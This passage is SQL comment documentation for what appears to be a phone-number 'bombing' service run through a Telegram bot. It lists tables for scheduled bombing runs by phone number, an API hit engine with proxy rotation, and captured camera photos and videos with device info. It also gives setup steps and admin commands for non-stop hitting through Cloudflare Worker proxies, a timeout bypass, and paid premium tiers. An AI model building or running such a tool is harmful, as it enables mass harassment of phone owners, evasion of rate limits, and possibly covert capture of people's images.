--                     - tgbot_usage_{chatId}: Per-user daily/total usage counters
-- captured_photos   : Camera capture photo metadata + device info
-- captured_videos   : Video capture metadata & URLs
-- search_history    : All search queries log
-- hit_apis          : API Hit Engine configurations
--                     - name, url, method, headers, body, body_type
--                     - query_params, enabled, proxy/rotation settings
--                     - Realtime sync enabled for live updates
-- scheduled_hits    : Scheduled bombing configurations
--                     - phone_number, start_time, interval_seconds
--                     - max_rounds, is_active, total_hits
--                     - Executed by pg_cron + execute-scheduled-hits
-- =====================================================
--
-- =====================================================
-- TELEGRAM BOT SETUP (v5.1)
-- =====================================================
-- 1. Set TELEGRAM_BOT_TOKEN in Edge Function Secrets
-- 2. Deploy: supabase functions deploy telegram-bot
-- 3. Set webhook: GET https://<PROJECT>.supabase.co/functions/v1/telegram-bot?action=setwebhook
-- 4. First user to send /setadmin becomes admin
--
-- Bot Features:
-- - Non-stop API hitting with CF Worker proxy + load balancing
-- - runId-based session locking (instant stop via button or /stop)
-- - Self-continue architecture (bypasses edge function timeout)
-- - Premium system (Basic/Pro/Ultimate with expiry)
-- - Daily limit for free users (configurable via /setlimit)
-- - Admin panel: manage APIs, keys, workers, premium, broadcast
-- - Mode toggle: Edge Function ↔ CF Worker (synced with website)
-- - Progress bar + live status message (single message, edited in-place)
--
-- Bot Commands:
-- /start - Main menu
-- /stop - Stop current hitting
-- /stats - View statistics
-- /settings - View/change settings
-- /help - All commands
-- /setadmin - First-time admin setup
-- /apis - List APIs (admin)
-- /addapi NAME|URL - Add API (admin)
-- /workers - List CF workers
-- /addworker URL - Add worker (admin)
-- /broadcast MSG - Broadcast to all (admin)
-- /setmode edge|cf - Change proxy mode (admin)
-- /setlimit N - Set free user daily limit (admin)
-- /givepremium ID PLAN DAYS - Give premium (admin)
-- =====================================================
